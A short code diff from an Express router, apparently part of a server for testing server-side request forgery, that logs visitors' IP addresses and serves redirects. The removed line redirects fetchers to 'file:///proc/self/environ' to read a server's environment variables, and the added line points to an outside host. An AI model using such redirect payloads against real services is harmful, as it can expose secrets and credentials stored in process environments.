@@ -33,7 +33,7 @@ router.get('/payload', function(req, res) {
  router.get('/redir3', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect(303, 'file:///proc/self/environ') // Notice the 303 parameter
+    res.redirect(303, 'https://toiletbrush.cleverapps.io') // Notice the 303 parameter
  });
 
 
